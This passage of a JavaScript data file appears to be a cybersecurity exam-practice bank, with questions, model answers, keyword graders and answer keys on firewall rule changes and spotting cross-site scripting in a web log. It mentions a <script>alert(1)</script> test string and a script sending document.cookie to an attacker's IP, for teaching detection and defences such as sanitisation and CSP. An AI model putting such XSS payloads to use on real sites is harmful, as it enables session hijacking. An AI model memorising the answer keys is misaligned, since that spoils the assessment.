    { id: 'D-iii', group: 'D', label: 'D (iii)', verb: 'Describe', pts: 1,
      text: 'Other than allowing the connection attempt identified in part D (i), describe one impact of your modification from part D (ii) on incoming or outgoing network traffic.',
      rule: 'A side effect of your change on other traffic.',
      model: 'Rule 5 would no longer allow port 5432, so the PostgreSQL traffic from 172.16.5.25 seen in Source 3 line 3 would now be blocked by rule 7.',
      checks: [{ k: 'any', any: ['block', 'no longer', 'expose', 'stop', 'risk', 'would now', 'deny'], msg: 'Describe a side effect on other traffic.' }] },
    { id: 'E-i', group: 'E', label: 'E (i)', verb: 'Determine', pts: 1,
      text: 'Apart from the password attack identified in part B, there is evidence of another attack on the device. Determine the type of attack evidenced in a log file.',
      rule: 'Names ONE attack: cross-site scripting (XSS).',
      model: 'Cross-site scripting (XSS)',
      checks: [{ k: 'has', any: ['xss', 'cross-site scripting', 'cross site scripting'], msg: 'Name the attack type.' }, { k: 'not', any: ['sql', 'ddos', 'traversal', 'buffer'], msg: 'One attack only: an extra wrong one costs the point.' }],
      evidence: [['S4-5', 'S4-6', 'S4-4']], need: 1,
      tiles: {
        claim: ['Cross-site scripting (XSS)', 'XSS and SQL injection', 'Brute force'],
        reason: ['The comment field contains <script> tags, including one that sends document.cookie to the attacker\'s IP.', 'The site got a lot of comments.', 'One IP visited the news page.'],
        correct: [0, 0]
      } },
    { id: 'E-ii', group: 'E', label: 'E (ii)', verb: 'Describe', pts: 1,
      text: 'Describe specific information in the log file that indicates the attack named in part E (i).',
      rule: 'Points to the specific malicious input in the log lines.',
      model: 'Source 4 lines 5–6: 198.51.100.200 submitted comments containing <script>alert(1)</script> and a script that sends document.cookie to 198.51.100.200, so other visitors\' browsers would run the attacker\'s code.',
      checks: [{ k: 'cite' }, { k: 'any', any: ['<script', 'script', 'document.cookie', 'cookie'], msg: 'Point to the script tags in the request.' }],
      evidence: [['S4-5', 'S4-6', 'S4-4']], need: 1,
      tiles: {
        claim: ['Source 4 lines 5–6 put <script> tags into the comment field.', 'Line 2 shows the attacker reading the news.', 'The server returned 200, so the attack worked.'],
        reason: ['The script on line 6 sends visitors\' document.cookie to 198.51.100.200, which could let the attacker hijack sessions.', 'Reading news is suspicious.', 'Code 200 always means hacked.'],
        correct: [0, 0]
      } },
    { id: 'E-iii', group: 'E', label: 'E (iii)', verb: 'Describe', pts: 1,
      text: 'Describe one way an automated system could halt this type of attack in real time.',
      rule: 'An automated control that detects the pattern and acts as it happens.',
      model: 'A web application firewall could detect <script> tags in request parameters and drop the request immediately, blocking 198.51.100.200.',
      checks: [{ k: 'any', any: ['ips', 'waf', 'firewall', 'automat', 'detect', 'block'], msg: 'Name the automated system and what it does.' }] },
    { id: 'E-iv', group: 'E', label: 'E (iv)', verb: 'Identify', pts: 1,
      text: 'This attack could be mitigated by an automated system such as a firewall, IDS, IPS, or AI. Identify a different countermeasure that could mitigate, prevent, or deter the attack.',
      rule: 'A countermeasure other than the listed automated systems (input sanitization, output encoding, Content Security Policy).',
      model: 'Sanitize and encode user input in the comment form so < and > are displayed as text instead of running as code.',
      checks: [{ k: 'any', any: ['sanitiz', 'encod', 'escape', 'validat', 'content security policy', 'csp', 'httponly'], msg: 'Name a countermeasure other than an automated system.' }, { k: 'not', any: ['ips', 'ids', 'firewall', ' ai'], msg: 'The prompt already listed those; name a different one.' }] }
  ]
}
];
